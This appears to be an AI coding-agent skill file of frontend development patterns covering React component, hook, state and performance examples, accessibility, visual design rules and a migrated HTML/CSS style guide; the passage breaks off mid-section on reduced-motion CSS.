---
name: frontend-patterns
description: Frontend development patterns for React, React Native, Vue, Next.js, SwiftUI, Flutter, state management, performance optimization, and UI best practices.
paths:
  - "**/*.html"
  - "**/*.htm"
  - "**/*.css"
  - "**/*.scss"
  - "**/*.sass"
  - "**/*.less"
  - "**/*.styl"
  - "**/*.vue"
  - "**/*.svelte"
  - "**/*.tsx"
  - "**/*.jsx"
  - "**/components/**"
  - "**/views/**"
  - "**/pages/**"
  - "**/layouts/**"
---

# Frontend Development Patterns

Modern frontend patterns for React, React Native, Vue, Next.js, SwiftUI, Flutter, and performant user interfaces.

> **Reuse-first** (per `~/.claude/rules-library/common/reuse-first.md`):
> Before creating a new component / hook / composable / store /
> service, sweep the project's `components/`, `composables/`,
> `hooks/`, `lib/`, `stores/`, `services/` directories for an
> existing primitive. One source of truth per primitive (one
> button, one modal, one toast, one form field, one currency
> formatter, one API client). Extend with a prop — never fork.

## When to Activate

- Building React components (composition, props, rendering)
- Managing state (useState, useReducer, Zustand, Context)
- Implementing data fetching (SWR, React Query, server components)
- Optimizing performance (memoization, virtualization, code splitting)
- Working with forms (validation, controlled inputs, Zod schemas)
- Handling client-side routing and navigation
- Building accessible, responsive UI patterns

## Component Patterns

### Composition Over Inheritance

```typescript
// ✅ GOOD: Component composition
interface CardProps {
  children: React.ReactNode
  variant?: 'default' | 'outlined'
}

export function Card({ children, variant = 'default' }: CardProps) {
  return <div className={`card card-${variant}`}>{children}</div>
}

export function CardHeader({ children }: { children: React.ReactNode }) {
  return <div className="card-header">{children}</div>
}

export function CardBody({ children }: { children: React.ReactNode }) {
  return <div className="card-body">{children}</div>
}

// Usage
<Card>
  <CardHeader>Title</CardHeader>
  <CardBody>Content</CardBody>
</Card>
```

### Compound Components

```typescript
interface TabsContextValue {
  activeTab: string
  setActiveTab: (tab: string) => void
}

const TabsContext = createContext<TabsContextValue | undefined>(undefined)

export function Tabs({ children, defaultTab }: {
  children: React.ReactNode
  defaultTab: string
}) {
  const [activeTab, setActiveTab] = useState(defaultTab)

  return (
    <TabsContext.Provider value={{ activeTab, setActiveTab }}>
      {children}
    </TabsContext.Provider>
  )
}

export function TabList({ children }: { children: React.ReactNode }) {
  return <div className="tab-list">{children}</div>
}

export function Tab({ id, children }: { id: string, children: React.ReactNode }) {
  const context = useContext(TabsContext)
  if (!context) throw new Error('Tab must be used within Tabs')

  return (
    <button
      className={context.activeTab === id ? 'active' : ''}
      onClick={() => context.setActiveTab(id)}
    >
      {children}
    </button>
  )
}

// Usage
<Tabs defaultTab="overview">
  <TabList>
    <Tab id="overview">Overview</Tab>
    <Tab id="details">Details</Tab>
  </TabList>
</Tabs>
```

### Render Props Pattern

```typescript
interface DataLoaderProps<T> {
  url: string
  children: (data: T | null, loading: boolean, error: Error | null) => React.ReactNode
}

export function DataLoader<T>({ url, children }: DataLoaderProps<T>) {
  const [data, setData] = useState<T | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<Error | null>(null)

  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(setData)
      .catch(setError)
      .finally(() => setLoading(false))
  }, [url])

  return <>{children(data, loading, error)}</>
}

// Usage
<DataLoader<Market[]> url="/api/markets">
  {(markets, loading, error) => {
    if (loading) return <Spinner />
    if (error) return <Error error={error} />
    return <MarketList markets={markets!} />
  }}
</DataLoader>
```

## Custom Hooks Patterns

### State Management Hook

```typescript
export function useToggle(initialValue = false): [boolean, () => void] {
  const [value, setValue] = useState(initialValue)

  const toggle = useCallback(() => {
    setValue(v => !v)
  }, [])

  return [value, toggle]
}

// Usage
const [isOpen, toggleOpen] = useToggle()
```

### Async Data Fetching Hook

```typescript
interface UseQueryOptions<T> {
  onSuccess?: (data: T) => void
  onError?: (error: Error) => void
  enabled?: boolean
}

export function useQuery<T>(
  key: string,
  fetcher: () => Promise<T>,
  options?: UseQueryOptions<T>
) {
  const [data, setData] = useState<T | null>(null)
  const [error, setError] = useState<Error | null>(null)
  const [loading, setLoading] = useState(false)

  const refetch = useCallback(async () => {
    setLoading(true)
    setError(null)

    try {
      const result = await fetcher()
      setData(result)
      options?.onSuccess?.(result)
    } catch (err) {
      const error = err as Error
      setError(error)
      options?.onError?.(error)
    } finally {
      setLoading(false)
    }
  }, [fetcher, options])

  useEffect(() => {
    if (options?.enabled !== false) {
      refetch()
    }
  }, [key, refetch, options?.enabled])

  return { data, error, loading, refetch }
}

// Usage
const { data: markets, loading, error, refetch } = useQuery(
  'markets',
  () => fetch('/api/markets').then(r => r.json()),
  {
    onSuccess: data => console.log('Fetched', data.length, 'markets'),
    onError: err => console.error('Failed:', err)
  }
)
```

### Debounce Hook

```typescript
export function useDebounce<T>(value: T, delay: number): T {
  const [debouncedValue, setDebouncedValue] = useState<T>(value)

  useEffect(() => {
    const handler = setTimeout(() => {
      setDebouncedValue(value)
    }, delay)

    return () => clearTimeout(handler)
  }, [value, delay])

  return debouncedValue
}

// Usage
const [searchQuery, setSearchQuery] = useState('')
const debouncedQuery = useDebounce(searchQuery, 500)

useEffect(() => {
  if (debouncedQuery) {
    performSearch(debouncedQuery)
  }
}, [debouncedQuery])
```

## State Management Patterns

### Context + Reducer Pattern

```typescript
interface State {
  markets: Market[]
  selectedMarket: Market | null
  loading: boolean
}

type Action =
  | { type: 'SET_MARKETS'; payload: Market[] }
  | { type: 'SELECT_MARKET'; payload: Market }
  | { type: 'SET_LOADING'; payload: boolean }

function reducer(state: State, action: Action): State {
  switch (action.type) {
    case 'SET_MARKETS':
      return { ...state, markets: action.payload }
    case 'SELECT_MARKET':
      return { ...state, selectedMarket: action.payload }
    case 'SET_LOADING':
      return { ...state, loading: action.payload }
    default:
      return state
  }
}

const MarketContext = createContext<{
  state: State
  dispatch: Dispatch<Action>
} | undefined>(undefined)

export function MarketProvider({ children }: { children: React.ReactNode }) {
  const [state, dispatch] = useReducer(reducer, {
    markets: [],
    selectedMarket: null,
    loading: false
  })

  return (
    <MarketContext.Provider value={{ state, dispatch }}>
      {children}
    </MarketContext.Provider>
  )
}

export function useMarkets() {
  const context = useContext(MarketContext)
  if (!context) throw new Error('useMarkets must be used within MarketProvider')
  return context
}
```

## Performance Optimization

### Memoization

```typescript
// ✅ useMemo for expensive computations
const sortedMarkets = useMemo(() => {
  return markets.sort((a, b) => b.volume - a.volume)
}, [markets])

// ✅ useCallback for functions passed to children
const handleSearch = useCallback((query: string) => {
  setSearchQuery(query)
}, [])

// ✅ React.memo for pure components
export const MarketCard = React.memo<MarketCardProps>(({ market }) => {
  return (
    <div className="market-card">
      <h3>{market.name}</h3>
      <p>{market.description}</p>
    </div>
  )
})
```

### Code Splitting & Lazy Loading

```typescript
import { lazy, Suspense } from 'react'

// ✅ Lazy load heavy components
const HeavyChart = lazy(() => import('./HeavyChart'))
const ThreeJsBackground = lazy(() => import('./ThreeJsBackground'))

export function Dashboard() {
  return (
    <div>
      <Suspense fallback={<ChartSkeleton />}>
        <HeavyChart data={data} />
      </Suspense>

      <Suspense fallback={null}>
        <ThreeJsBackground />
      </Suspense>
    </div>
  )
}
```

### Virtualization for Long Lists

```typescript
import { useVirtualizer } from '@tanstack/react-virtual'

export function VirtualMarketList({ markets }: { markets: Market[] }) {
  const parentRef = useRef<HTMLDivElement>(null)

  const virtualizer = useVirtualizer({
    count: markets.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 100,  // Estimated row height
    overscan: 5  // Extra items to render
  })

  return (
    <div ref={parentRef} style={{ height: '600px', overflow: 'auto' }}>
      <div
        style={{
          height: `${virtualizer.getTotalSize()}px`,
          position: 'relative'
        }}
      >
        {virtualizer.getVirtualItems().map(virtualRow => (
          <div
            key={virtualRow.index}
            style={{
              position: 'absolute',
              top: 0,
              left: 0,
              width: '100%',
              height: `${virtualRow.size}px`,
              transform: `translateY(${virtualRow.start}px)`
            }}
          >
            <MarketCard market={markets[virtualRow.index]} />
          </div>
        ))}
      </div>
    </div>
  )
}
```

## Form Handling Patterns

### Controlled Form with Validation

```typescript
interface FormData {
  name: string
  description: string
  endDate: string
}

interface FormErrors {
  name?: string
  description?: string
  endDate?: string
}

export function CreateMarketForm() {
  const [formData, setFormData] = useState<FormData>({
    name: '',
    description: '',
    endDate: ''
  })

  const [errors, setErrors] = useState<FormErrors>({})

  const validate = (): boolean => {
    const newErrors: FormErrors = {}

    if (!formData.name.trim()) {
      newErrors.name = 'Name is required'
    } else if (formData.name.length > 200) {
      newErrors.name = 'Name must be under 200 characters'
    }

    if (!formData.description.trim()) {
      newErrors.description = 'Description is required'
    }

    if (!formData.endDate) {
      newErrors.endDate = 'End date is required'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validate()) return

    try {
      await createMarket(formData)
      // Success handling
    } catch (error) {
      // Error handling
    }
  }

  return (
    <form onSubmit={handleSubmit}>
      <input
        value={formData.name}
        onChange={e => setFormData(prev => ({ ...prev, name: e.target.value }))}
        placeholder="Market name"
      />
      {errors.name && <span className="error">{errors.name}</span>}

      {/* Other fields */}

      <button type="submit">Create Market</button>
    </form>
  )
}
```

## Error Boundary Pattern

```typescript
interface ErrorBoundaryState {
  hasError: boolean
  error: Error | null
}

export class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  ErrorBoundaryState
> {
  state: ErrorBoundaryState = {
    hasError: false,
    error: null
  }

  static getDerivedStateFromError(error: Error): ErrorBoundaryState {
    return { hasError: true, error }
  }

  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
    console.error('Error boundary caught:', error, errorInfo)
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <h2>Something went wrong</h2>
          <p>{this.state.error?.message}</p>
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      )
    }

    return this.props.children
  }
}

// Usage
<ErrorBoundary>
  <App />
</ErrorBoundary>
```

## Animation Patterns

### Framer Motion Animations

```typescript
import { motion, AnimatePresence } from 'framer-motion'

// ✅ List animations
export function AnimatedMarketList({ markets }: { markets: Market[] }) {
  return (
    <AnimatePresence>
      {markets.map(market => (
        <motion.div
          key={market.id}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.3 }}
        >
          <MarketCard market={market} />
        </motion.div>
      ))}
    </AnimatePresence>
  )
}

// ✅ Modal animations
export function Modal({ isOpen, onClose, children }: ModalProps) {
  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div
            className="modal-overlay"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={onClose}
          />
          <motion.div
            className="modal-content"
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: 20 }}
          >
            {children}
          </motion.div>
        </>
      )}
    </AnimatePresence>
  )
}
```

## Accessibility Patterns

### Keyboard Navigation

```typescript
export function Dropdown({ options, onSelect }: DropdownProps) {
  const [isOpen, setIsOpen] = useState(false)
  const [activeIndex, setActiveIndex] = useState(0)

  const handleKeyDown = (e: React.KeyboardEvent) => {
    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault()
        setActiveIndex(i => Math.min(i + 1, options.length - 1))
        break
      case 'ArrowUp':
        e.preventDefault()
        setActiveIndex(i => Math.max(i - 1, 0))
        break
      case 'Enter':
        e.preventDefault()
        onSelect(options[activeIndex])
        setIsOpen(false)
        break
      case 'Escape':
        setIsOpen(false)
        break
    }
  }

  return (
    <div
      role="combobox"
      aria-expanded={isOpen}
      aria-haspopup="listbox"
      onKeyDown={handleKeyDown}
    >
      {/* Dropdown implementation */}
    </div>
  )
}
```

### Focus Management

```typescript
export function Modal({ isOpen, onClose, children }: ModalProps) {
  const modalRef = useRef<HTMLDivElement>(null)
  const previousFocusRef = useRef<HTMLElement | null>(null)

  useEffect(() => {
    if (isOpen) {
      // Save currently focused element
      previousFocusRef.current = document.activeElement as HTMLElement

      // Focus modal
      modalRef.current?.focus()
    } else {
      // Restore focus when closing
      previousFocusRef.current?.focus()
    }
  }, [isOpen])

  return isOpen ? (
    <div
      ref={modalRef}
      role="dialog"
      aria-modal="true"
      tabIndex={-1}
      onKeyDown={e => e.key === 'Escape' && onClose()}
    >
      {children}
    </div>
  ) : null
}
```

## Visual design quality

Architecture without aesthetics ships generic UI. This section
covers the design-quality discipline that complements every
pattern above. Apply BEFORE writing UI code — choose the
aesthetic direction with intent.

### Design thinking (before coding)

Commit to a clear aesthetic direction:

- **Purpose** — what problem does this interface solve? Who uses it?
- **Tone** — pick a clear direction: brutally minimal, luxury /
  refined, soft / pastel, industrial / utilitarian, editorial /
  magazine, playful, retro-futuristic, organic, art deco, or any
  intentional aesthetic.
- **Differentiation** — what makes this interface memorable? What
  will users notice in 5 seconds?

**Key principle**: intentionality > intensity. Bold maximalism +
refined minimalism BOTH work — execute the chosen vision with
precision.

### Typography rules

- **DO** — choose fonts that are beautiful, unique, characterful.
  Pair a distinctive display font with a refined body font.
- **NEVER** — `Inter`, `Roboto`, `Arial`, `system-ui`, or other
  generic overused fonts. Every project deserves a distinctive
  typographic identity. (Also avoid converging on the same
  "interesting" choice — `Space Grotesk`, `Manrope` — across every
  project.)

### Color + theme rules

- Commit to a cohesive color system using CSS variables / design
  tokens (per `~/.claude/rules-library/common/no-discards.md` — raw hex /
  rgb / hsl / oklch literals in component files are hook-rejected).
- Dominant colors with sharp accents outperform timid, evenly-
  distributed palettes.
- **NEVER** — purple gradients on white backgrounds, or other
  cliched AI-generated colour schemes (mint-green + lavender,
  Stripe-purple, etc.).
- Vary between light + dark themes across projects — don't
  converge on one default.

### Motion + animation

- **High-impact moments** — one well-orchestrated page load with
  staggered reveals creates more delight than scattered
  micro-interactions.
- **CSS-first** for HTML / Vue / simple components.
- **Motion library** (or Framer Motion) for React when richer
  control is genuinely needed.
- **Respect `prefers-reduced-motion`** (per `a11y.md`).
- Scroll-triggering + hover states that surprise.

### Spatial composition

- Unexpected layouts: asymmetry, overlap, diagonal flow, grid-
  breaking elements.
- Generous negative space OR controlled density — both valid; the
  middle ground is forgettable.
- Avoid predictable, cookie-cutter component arrangements
  (centre-aligned hero + 3-column features + 2-column CTA — the
  default-AI shape).

### Visual details + atmosphere

Create depth + atmosphere rather than defaulting to solid colours:

- Gradient meshes, noise textures, geometric patterns
- Layered transparencies, dramatic shadows, decorative borders
- Grain overlays, custom cursors, contextual effects
- Match visual effects to the overall aesthetic direction

### Implementation complexity matching

- **Maximalist designs** — elaborate code with extensive animations
  - effects justified
- **Minimalist designs** — restraint, precision, careful spacing +
  typography
- **Elegance = executing the vision well**, not adding more effects

### Anti-patterns (NEVER ship)

- Generic font families (`Inter`, `Roboto`, `Arial`, system fonts)
- Cliched colour schemes (purple gradient on white)
- Predictable layouts + component arrangements
- Cookie-cutter design that lacks context-specific character
- Same aesthetic across every project
- Raw colour literals in component files (per `no-discards.md`
  hook — design-token-only)

## Related Skills

This skill provides **architectural + visual patterns** for
frontend development.

- **coding-standards** — code quality: naming, structure,
  readability, immutability
- **security-review** — XSS prevention in dynamic content + styling
- **vue3-patterns**, **typescript-patterns** — framework-specific
  depth
- **a11y.md** (rule) — WCAG 2.2 AA floor + AAA on critical paths

**Remember**: Modern frontend patterns enable maintainable,
performant user interfaces. Choose patterns that fit your project
complexity. Pair architecture (above) with the visual design
quality discipline so the UI is visually excellent, not just
architecturally sound.

## Purpose

Frontend architecture patterns for React, React Native, Vue 3, Next.js, SwiftUI, and Flutter: component composition, state management, data fetching, form handling, performance optimisation, accessibility, and visual design quality (typography, color, motion, spatial composition).

**Negative scope**: NOT CSS framework recommendations. NOT generic JS/TS coding style (use `coding-standards`). NOT API contract design (use `api-design`). NOT framework-specific deep idioms (use `vue3-patterns` for Vue, dedicated Swift/Flutter skills).

## When NOT to use

- Pure backend services (no UI surface)
- Static-only documentation sites with no client-side state
- CLI tools / scripts
- Native mobile work that uses a non-listed framework (Kotlin/Compose, native Android XML, native iOS UIKit-only)
- When the answer is a one-line CSS tweak

## Standards Cited

- **WCAG 2.2** (W3C Recommendation, Oct 2023) §1.4.3 (Contrast Minimum), §2.4.7 (Focus Visible), §2.5.8 (Target Size Minimum 24×24 CSS px)
- **WAI-ARIA 1.2** — semantic role + state attributes
- **React Documentation (react.dev)** — Hooks rules, Strict Mode, Server Components contract
- **Vue 3.5 Reactivity Fundamentals** — `ref` / `reactive` / `computed` / `watch` semantics
- **Web Content Accessibility Guidelines (WCAG) 2.2 Quick Reference**
- **OWASP Top 10 (2021)** A03 (Injection) — XSS / DOM sinks
- **Core Web Vitals (web.dev)** — LCP < 2.5s, INP < 200ms, CLS < 0.1

## Anti-Patterns

| Pattern | Why bad | Correct alternative |
| --- | --- | --- |
| Array index as React `key` | Re-render mis-association on reorder; lost DOM state (focus, video position) | Stable ID from data (`item.id`) |
| `dangerouslySetInnerHTML` with user input | XSS injection (OWASP A03) | `textContent` / framework auto-escape; `DOMPurify` if rich HTML required |
| Stale-closure setter (`setCount(count + 1)` in async) | Returns wrong value on fast updates | Functional setter: `setCount(prev => prev + 1)` |
| `useEffect` with no dep array for fetch | Fetches on every render → infinite loop | `useEffect(..., [stableDeps])` OR React Query / SWR |
| Context value object recreated each render | Forces every consumer to re-render | `useMemo(() => ({ ... }), [deps])` for context value |
| `<div onClick={…}>` instead of `<button>` | Inaccessible; keyboard navigation broken; screen readers miss it | Semantic HTML: `<button>`, `<a>`, `<dialog>` |
| `outline: none` on focus without alt indicator | WCAG 2.4.7 violation; keyboard users can't see focus | Keep visible focus ring (custom OK as long as visible + 3:1 contrast) |
| Auto-playing video / motion without `prefers-reduced-motion` check | Vestibular triggers; accessibility regression | `@media (prefers-reduced-motion: reduce) { animation: none; }` |

## Verification Checklist

- [ ] Every interactive element reachable + actionable via keyboard (Tab, Enter, Space, Esc)
- [ ] Visible focus indicator with ≥ 3:1 contrast (WCAG 2.4.7 + 1.4.11)
- [ ] All images have meaningful `alt` (or `alt=""` for decorative)
- [ ] Forms have `<label>` associated via `htmlFor` / `id`; errors via `aria-describedby`
- [ ] Touch targets ≥ 24×24 CSS pixels (WCAG 2.5.8)
- [ ] Color is not the only signal (red + icon + text)
- [ ] `prefers-reduced-motion` honoured on animation
- [ ] No `console.log` in shipped bundle
- [ ] LCP < 2.5s, INP < 200ms, CLS < 0.1 on critical pages
- [ ] Bundle audited: no duplicate React, no `moment` (use date-fns / dayjs), tree-shaken icons

## Cross-References

- `~/.claude/rules-library/common/a11y.md` — WCAG 2.2 floor + critical-path AAA
- `~/.claude/rules-library/common/i18n.md` — Intl APIs, RTL, ICU MessageFormat
- `~/.claude/rules-library/common/no-discards.md` — banned discard patterns (`as any` casts, empty catches)
- `~/.claude/skills/vue3-patterns/SKILL.md` — Vue 3.5 specifics
- `~/.claude/skills/typescript-patterns/SKILL.md` — TS idioms for components
- `~/.claude/agents/accessibility-reviewer.md` — WCAG audit
- `~/.claude/agents/ux-reviewer.md` — copy, microcopy, error states

## Why this skill exists

Frontend is where users meet the product. The recurring failure modes:

- Inaccessible UI (no keyboard nav, no focus ring, screen-reader empty) → 15-20% of users excluded; legal exposure under ADA / EAA / AODA
- XSS through `dangerouslySetInnerHTML` → session theft, account takeover
- Stale-closure bugs in async updates → counters drift, double-submits, lost data
- Visual design that screams "AI-generic" (purple gradients, cookie-cutter layouts) → trust + conversion suffer
- Performance regressions (LCP > 4s on mobile) → bounce rate + SEO impact

Cost of accessible + secure + performant components at write time: minutes per component. Cost of retrofit: quarters + legal exposure + lost conversion.

## Learning hooks

Per `~/.claude/rules/common/continuous-learning-mandate.md`:

**Signals to watch**:

- Generic AI aesthetic detected (purple gradients, cookie-cutter card layout, no distinctive typography)
- Inter / Roboto / Arial used as the primary font without rationale (visual-design generic drift)
- Animations purposeless / decorative without functional intent
- Raw color literals (hex / rgb / hsl / oklch) introduced — hook-blocked per `no-discards.md`
- `!important` introduced in CSS / Tailwind arbitrary value (hook-warned)
- Component prop list > 5 (sister `extreme-lint-policy.md` S107) — should be Options object
- Array index used as list key (S6479)
- Context `value` not memoized (S6481) — causes cascading re-renders
- Inline form / onSubmit without `event.preventDefault()` (broken in SPA)
- Accessibility regression: missing `aria-*` on custom widget, missing focus ring on interactive element

**Refinement candidates**:

- New design-quality row when a recurring "looks AI-generated" feedback class emerges
- Tightening of the typography / color / motion bars when a new design-system standard ships (Material 4, Apple HIG update)
- New cross-reference when a sister skill (vue3-patterns, wcag-accessibility, interaction-design) adds a frontend-relevant gate
- New canonical component template when a recurring UI primitive (data table, command palette, multi-step form) gains adoption

<!-- ============================================================
     Migration appendix: 2026-06-02 lazy-rules-loading
     Source: /Users/APPLE/.claude/rules-library/html-css/
     ============================================================ -->

## Migrated rules (rules-library/html-css/, 2026-06-02)

Phase H will delete the source files at `rules-library/html-css/`. Content below preserves the original rule bodies for lazy-load via the `paths:` glob above.

---

<!-- ============================================================
     Section: html-css/coding-style.md
     ============================================================ -->

# HTML / CSS Coding Style

> Auto-fires on every `*.html`, `*.htm`, `*.css`, `*.scss`,
> `*.sass`, `*.less`, `*.module.css`, `*.styl`,
> `*.postcssrc`, `*.stylelintrc*`, `*.css.ts`, `*.styled.ts`
> file. Standards: **HTML Living Standard (WHATWG, last updated
> 28 May 2026)**, **CSS Snapshot 2026** (W3C — Cascading Style
> Sheets specifications), **WCAG 2.2** (W3C Recommendation, Oct
> 2023), **ARIA 1.2**, **stylelint 17.11.0** with
> **stylelint-config-standard 40.0.0**, **HTMLHint** (current),
> **Prettier 3.x** (formatting only).

## Core Principle

**Semantic HTML first; CSS handles presentation; ARIA fills the
gaps semantic HTML cannot. Every element exists for a reason a
screen reader can articulate. Every CSS value comes from a token
(custom property), never an inline literal. Every interactive
element is keyboard-reachable, focus-visible, hit-target ≥ 24×24
CSS pixels (WCAG 2.2 §2.5.8). Layout via Flexbox / Grid /
intrinsic-sizing functions; never via tables, never via absolute
positioning for layout. CSS is cascading + specificity-managed;
the design system owns the cascade root and components extend
it.**

## Hard rules

### 1. Semantic HTML, never `<div>` soup

Every interactive element uses the HTML element that names its
role. ARIA is the LAST resort (per WAI-ARIA Authoring Practices
"First Rule of ARIA: don't").

```html
<!-- WRONG — div soup with role attribute -->
<div onclick="submitForm()" role="button" tabindex="0">Submit</div>

<!-- RIGHT — native button -->
<button type="submit">Submit</button>

<!-- WRONG — div as heading -->
<div class="heading-1">Page title</div>

<!-- RIGHT — h1 -->
<h1>Page title</h1>

<!-- WRONG — span as link -->
<span onclick="navigate('/about')">About</span>

<!-- RIGHT — anchor -->
<a href="/about">About</a>
```

Mapping:

| Semantic element | Use for |
| --- | --- |
| `<button>` | Triggers an action on the current page |
| `<a href>` | Navigates to a new URL or same-page anchor |
| `<input>` / `<textarea>` / `<select>` | Form data entry |
| `<label>` | Associated with a form control via `for=` |
| `<fieldset>` / `<legend>` | Grouping related form controls |
| `<nav>` | Primary / secondary navigation |
| `<main>` | The page's primary content (one per page) |
| `<article>` | Self-contained content (post, card) |
| `<aside>` | Tangential content (callout, sidebar) |
| `<section>` | Thematic grouping with a heading |
| `<header>` / `<footer>` | Page or section header / footer |
| `<details>` / `<summary>` | Disclosure widget (native, no JS) |
| `<dialog>` | Modal or non-modal dialog (with `showModal()`) |
| `<table>` + `<thead>` / `<tbody>` / `<tfoot>` / `<caption>` | TABULAR DATA ONLY; never layout |
| `<figure>` / `<figcaption>` | Image / chart with caption |
| `<time datetime="...">` | Machine-readable timestamp |
| `<address>` | Contact info for the nearest article / page |

### 2. One `<h1>` per page; heading hierarchy never skips levels

Screen-reader users navigate by headings (NVDA + JAWS bind `H`
to next heading; VoiceOver iOS uses the rotor). Skipping levels
(h1 → h3) breaks document outline.

```html
<!-- CORRECT -->
<h1>Article title</h1>
<h2>Section</h2>
<h3>Subsection</h3>
<h3>Subsection</h3>
<h2>Section</h2>

<!-- WRONG — visual hierarchy via CSS, semantic disconnect -->
<div class="title-xl">Article title</div>
<div class="title-lg">Section</div>
```

### 3. Every form input has an associated label

```html
<!-- WRONG -->
<input type="email" placeholder="Email" />

<!-- RIGHT — explicit label/for -->
<label for="email">Email</label>
<input type="email" id="email" name="email" autocomplete="email" required />

<!-- RIGHT — implicit (wrapped) -->
<label>
  Email
  <input type="email" name="email" autocomplete="email" required />
</label>
```

Placeholder text is NOT a label substitute (disappears on focus;
fails colour contrast; not announced as a name by older AT).

Required attributes on every form input:

- `name` — for form submission
- `id` (if used by `<label for>`)
- `type` — narrow as possible (`email`, `tel`, `url`, `number`,
  `date`, `time`, `search`)
- `autocomplete` — see WCAG 2.2 §1.3.5 + WHATWG autofill values
- `required` / `aria-required` when required
- `inputmode` — guides mobile keyboard

### 4. Every image has `alt` text

```html
<!-- Content image -->
<img src="payments-chart-q2.svg" alt="Q2 payments volume: $4.2M, up 18% from Q1" />

<!-- Decorative image (no information conveyed) -->
<img src="divider.svg" alt="" role="presentation" />

<!-- Image with surrounding caption -->
<figure>
  <img src="payments-chart-q2.svg" alt="" />
  <figcaption>Q2 payments volume: $4.2M, up 18% from Q1</figcaption>
</figure>
```

`alt=""` (empty string) is REQUIRED for decorative images — NOT
omitted. Missing `alt` attribute (vs `alt=""`) is a screen-reader
fallback to the filename.

### 5. `lang` attribute on every page; per-region overrides

```html
<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Page title — Site</title>
  </head>
  <body>
    <main>
      <p>Most content in English.</p>
      <p lang="fr">Une citation en français.</p>
    </main>
  </body>
</html>
```

WCAG 2.2 §3.1.1 (Language of Page) + §3.1.2 (Language of Parts).

### 6. CSS custom properties (variables) as design tokens

Every value used in 3+ places lives as a custom property.
Tokens cascade from `:root` (or a design-system root selector).

```css
/* WRONG — raw values scattered */
.button-primary {
  background: #4f46e5;
  color: #ffffff;
  padding: 12px 24px;
  font-size: 16px;
  border-radius: 8px;
}
.card-shadow {
  box-shadow: 0 4px 12px rgba(79, 70, 229, 0.15);
}

/* RIGHT — tokens at root, components reference them */
:root {
  --color-brand-500: #4f46e5;
  --color-brand-50: #eef2ff;
  --color-text-on-brand: #ffffff;

  --space-3: 0.75rem;     /* 12px @ 16px root */
  --space-6: 1.5rem;      /* 24px */

  --font-size-base: 1rem;
  --font-size-md: 1.0625rem;

  --radius-sm: 0.25rem;
  --radius-md: 0.5rem;

  --shadow-md: 0 4px 12px hsl(238 84% 60% / 0.15);

  --duration-fast: 150ms;
  --easing-default: cubic-bezier(0.4, 0, 0.2, 1);
}

.button-primary {
  background: var(--color-brand-500);
  color: var(--color-text-on-brand);
  padding: var(--space-3) var(--space-6);
  font-size: var(--font-size-base);
  border-radius: var(--radius-md);
}
.card { box-shadow: var(--shadow-md); }
```

Per the post-edit hook on UI files (no-discards.md), raw colour
literals (`#fff`, `rgb(...)`, `hsl(...)`, `oklch(...)`) inside
component CSS are REJECTED. Tokens live in the design-system
file (`tokens.css`, `theme.css`); components reference.

### 7. Layout via Flexbox / Grid / intrinsic; never via tables

```css
/* CORRECT — Grid for two-column layout */
.layout {
  display: grid;
  grid-template-columns: minmax(0, 1fr) minmax(0, 2fr);
  gap: var(--space-6);
}

/* CORRECT — Flexbox for one-axis composition */
.toolbar {
  display: flex;
  align-items: center;
  gap: var(--space-3);
}

/* CORRECT — intrinsic sizing */
.responsive-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(min(100%, 18rem), 1fr));
  gap: var(--space-6);
}
```

`<table>` is for tabular data only. Multi-column form layouts
use CSS Grid `grid-template-columns: auto 1fr` (with form
controls).

### 8. Logical properties (RTL-ready)

Per [`common/i18n.md`](../../rules-library/common/i18n.md) — RTL languages
mirror layout. Use CSS logical properties to support mirror
automatically:

```css
/* WRONG — physical properties; LTR-only */
.menu {
  margin-left: var(--space-3);
  padding-right: var(--space-6);
  text-align: left;
  border-left: 1px solid var(--color-border);
}

/* RIGHT — logical properties; auto-mirrors in RTL */
.menu {
  margin-inline-start: var(--space-3);
  padding-inline-end: var(--space-6);
  text-align: start;
  border-inline-start: 1px solid var(--color-border);
}
```

Property map:

| Physical | Logical |
| --- | --- |
| `margin-left` | `margin-inline-start` |
| `margin-right` | `margin-inline-end` |
| `padding-top` | `padding-block-start` |
| `padding-bottom` | `padding-block-end` |
| `width` | `inline-size` |
| `height` | `block-size` |
| `left` | `inset-inline-start` |
| `top` | `inset-block-start` |
| `text-align: left` | `text-align: start` |
| `border-left` | `border-inline-start` |

### 9. Focus indicator: always visible, never `outline: none` alone

```css
/* WRONG — removes keyboard accessibility entirely */
button:focus { outline: none; }

/* CORRECT — replace with a visible focus ring */
button:focus-visible {
  outline: 2px solid var(--color-focus-ring);
  outline-offset: 2px;
}

/* CORRECT — focus ring uses CSS custom property */
:root {
  --color-focus-ring: oklch(60% 0.18 240); /* visible on light + dark */
}
```

WCAG 2.2 §2.4.7 (Focus Visible) + §2.4.11 (Focus Not Obscured —
new in 2.2). The focus ring must meet 3:1 contrast (§1.4.11
Non-Text Contrast).

### 10. Touch target ≥ 24×24 CSS pixels (WCAG 2.2 §2.5.8)

```css
/* Minimum interactive area */
.button {
  min-block-size: 2.5rem;    /* 40px @ 16px root — well above 24px */
  min-inline-size: 2.5rem;
}

/* Icon-only button — ensure clickable area */
.icon-button {
  inline-size: 2.75rem;
  block-size: 2.75rem;
  padding: 0;
  display: inline-flex;
  align-items: center;
  justify-content: center;
}
```

24×24 is the AA floor; 44×44 is Apple HIG / 48×48 is Material
Design recommendation.

### 11. `prefers-reduced-motion` respected

```css
@keyframes slide-in {
  from { transform: translateX(100%); }
